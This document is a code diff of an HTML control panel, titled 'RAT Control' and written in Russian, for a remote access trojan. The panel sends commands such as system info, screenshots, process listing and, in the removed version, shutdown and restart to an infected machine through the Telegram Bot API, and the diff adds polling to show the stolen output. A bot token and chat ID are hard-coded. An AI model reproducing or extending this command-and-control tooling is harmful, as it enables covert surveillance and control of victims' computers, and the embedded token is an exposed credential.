@@ -4,163 +4,80 @@
     <title>RAT Control</title>
     <meta charset="UTF-8">
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: #f0f0f0;
-            padding: 20px;
-            max-width: 800px;
-            margin: 0 auto;
-        }
-        h1 {
-            color: #333;
-            text-align: center;
-        }
-        .info {
-            background: #e3f2fd;
-            border-left: 4px solid #2196F3;
-            padding: 15px;
-            margin: 20px 0;
-            border-radius: 5px;
-        }
-        .button-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 10px;
-            margin: 20px 0;
-        }
-        button {
-            padding: 15px;
-            background: #0088cc;
-            color: white;
-            border: none;
-            border-radius: 10px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        button:hover {
-            background: #006699;
-            transform: scale(1.02);
-        }
-        .status {
-            background: #4caf50;
-            color: white;
-            padding: 10px;
-            border-radius: 5px;
-            text-align: center;
-            margin: 20px 0;
-        }
-        .note {
-            background: #fff3cd;
-            border-left: 4px solid #ffc107;
-            padding: 15px;
-            margin: 20px 0;
-            border-radius: 5px;
-        }
-        .bot-info {
-            background: #e8f5e9;
-            border-left: 4px solid #4caf50;
-            padding: 15px;
-            margin: 20px 0;
-            border-radius: 5px;
-        }
+        body { font-family: Arial; padding: 20px; background: #f0f0f0; }
+        button { padding: 15px; margin: 5px; background: #0088cc; color: white; border: none; border-radius: 10px; cursor: pointer; }
+        #output { background: white; padding: 20px; border-radius: 10px; margin-top: 20px; min-height: 200px; white-space: pre-wrap; }
+        #status { padding: 10px; margin: 10px 0; border-radius: 5px; }
     </style>
 </head>
 <body>
     <h1>🤖 RAT CONTROL</h1>
     
-    <div class="bot-info">
-        <strong>🤖 Бот:</strong> @asdasdasdasd_bot<br>
-        <strong>🆔 ID:</strong> 7266658879<br>
-        <strong>📱 Статус:</strong> <span id="botStatus">Проверка...</span>
-    </div>
+    <div id="status">✅ Готов</div>
     
-    <div class="status" id="status">
-        ✅ Готов к отправке
-    </div>
+    <button onclick="sendCommand('info')">📊 Информация</button>
+    <button onclick="sendCommand('screen')">📸 Скриншот</button>
+    <button onclick="sendCommand('processes')">📋 Процессы</button>
     
-    <div class="button-grid">
-        <button onclick="sendCommand('info')">📊 Информация</button>
-        <button onclick="sendCommand('cpu')">⚙️ Процессор</button>
-        <button onclick="sendCommand('ram')">💾 Память</button>
-        <button onclick="sendCommand('disk')">💿 Диски</button>
-        <button onclick="sendCommand('screen')">📸 Скриншот</button>
-        <button onclick="sendCommand('processes')">📋 Процессы</button>
-        <button onclick="sendCommand('shutdown')">⏻ Выключить</button>
-        <button onclick="sendCommand('restart')">🔄 Перезагрузить</button>
-    </div>
-
-    <div class="note">
-        <strong>📱 ВАЖНО!</strong><br>
-        1. Нажмите кнопку выше<br>
-        2. Откройте Telegram<br>
-        3. Найдите чат с ботом @asdasdasdasd_bot<br>
-        4. Там появится ответ!
-    </div>
-
-    <div class="info">
-        <strong>📋 Проверьте:</strong><br>
-        • Бот должен быть запущен на компьютере<br>
-        • В консоли бота должны появляться команды<br>
-        • Ответы приходят в Telegram
-    </div>
+    <div id="output">Здесь появятся результаты...</div>
 
     <script>
         const BOT_TOKEN = '8417099264:AAHZ_xx4NfBLs04BoGyutO0_dwaa66b-ECo';
         const CHAT_ID = 7266658879;
-
-        // Проверка статуса бота
-        async function checkBot() {
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
-                const data = await response.json();
-                if (data.ok) {
-                    document.getElementById('botStatus').innerHTML = '✅ Онлайн';
-                    document.getElementById('botStatus').style.color = '#4caf50';
-                } else {
-                    document.getElementById('botStatus').innerHTML = '❌ Офлайн';
-                    document.getElementById('botStatus').style.color = '#f44336';
-                }
-            } catch (e) {
-                document.getElementById('botStatus').innerHTML = '❌ Ошибка';
-            }
-        }
+        let lastUpdateId = 0;
+        let lastCommandTime = 0;
 
         // Отправка команды
         async function sendCommand(cmd) {
-            const status = document.getElementById('status');
-            status.innerHTML = '⏳ Отправка...';
-            status.style.background = '#ff9800';
+            document.getElementById('status').innerHTML = '⏳ Отправка команды...';
+            document.getElementById('status').style.background = '#ffc107';
+            lastCommandTime = Date.now();
             
+            // Отправляем команду
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: 'CMD:' + cmd  // Добавляем префикс CMD:
+                })
+            });
+        }
+
+        // Получение ответов
+        async function getUpdates() {
             try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: cmd
-                    })
-                });
-                
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`);
                 const data = await response.json();
                 
-                if (data.ok) {
-                    status.innerHTML = '✅ Команда отправлена! Проверьте Telegram';
-                    status.style.background = '#4caf50';
-                } else {
-                    status.innerHTML = '❌ Ошибка: ' + data.description;
-                    status.style.background = '#f44336';
+                if (data.ok && data.result.length > 0) {
+                    data.result.forEach(update => {
+                        lastUpdateId = update.update_id;
+                        
+                        if (update.message && update.message.text) {
+                            const text = update.message.text;
+                            
+                            // Показываем ответ в окне
+                            if (text.startsWith('📊') || text.startsWith('📋') || text.startsWith('✅') || text.startsWith('❌')) {
+                                document.getElementById('output').innerHTML = text.replace(/\n/g, '<br>');
+                                document.getElementById('status').innerHTML = '✅ Получен ответ';
+                                document.getElementById('status').style.background = '#28a745';
+                            }
+                        }
+                        
+                        // Показываем фото
+                        if (update.message && update.message.photo) {
+                            document.getElementById('output').innerHTML = '📸 Скриншот отправлен в Telegram';
+                        }
+                    });
                 }
             } catch (e) {
-                status.innerHTML = '❌ Ошибка: ' + e.message;
-                status.style.background = '#f44336';
+                console.error('Ошибка:', e);
             }
         }
 
-        // Проверяем бота при загрузке
-        checkBot();
-        // Проверяем каждые 30 секунд
-        setInterval(checkBot, 30000);
+        // Проверяем новые сообщения каждые 2 секунды
+        setInterval(getUpdates, 2000);
     </script>
 </body>
 </html>
